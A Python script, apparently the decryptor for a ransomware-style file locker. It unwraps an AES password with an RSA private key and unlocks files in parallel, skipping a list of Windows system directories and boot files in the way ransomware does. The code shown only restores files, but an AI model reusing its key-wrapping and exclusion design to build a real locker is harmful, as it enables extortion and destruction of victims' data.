import base64
import multiprocessing

from aes_class import LockPath
from aes_class import timeit
from rsa_class import RsaClass

def decrypt_paths():

    paths = ["./music"]
    WHITE_DIR = ['TESTLOCKSYSTEM', 'PROGRAMDATA', 'PROGRAM FILES (X86)', 'WINDOWS', 'PROGRAM FILES', '$WINDOWS.~WS', 'INTEL', 'MOZILLA', 'APPLICATION DATA', 'PERFLOGS', 'TOR BROWSER', '$WINDOWS.~BT', 'GOOGLE', '$RECYCLE.BIN', 'APPDATA', 'MSOCACHE', 'BOOT', 'WINDOWS.OLD', 'SYSTEM VOLUME INFORMATION']
    WHITE_FILE =  ['NTLDR', 'NTUSER.DAT', 'NTUSER.DAT.LOG', 'AUTORUN.INF', 'THUMBS.DB', 'BOOTSECT.BAK', 'BOOTFONT.BIN', 'NTUSER.INI', 'DESKTOP.INI', 'BOOT.INI', 'ICONCACHE.DB']
    encrypt_size = 16 * 1024 * 1024
    decrypt_size = encrypt_size + 32   
    private_key = RsaClass.load_pri("./rsapri.pem")
    password = RsaClass.load("./password.json")["aes_ciphered_password"]
    password = password.encode()
    password = base64.b64decode(password)
    password = RsaClass.decryption(private_key, password)
    password = password.decode()
    keylen = 32
    ivlen = 16
 
    L = LockPath(paths, WHITE_DIR, WHITE_FILE, 
    encrypt_size, decrypt_size, password, keylen, ivlen)
    L.multiprocessing_unlock_path()


if __name__ == "__main__":
    multiprocessing.set_start_method("spawn")
    decrypt_paths()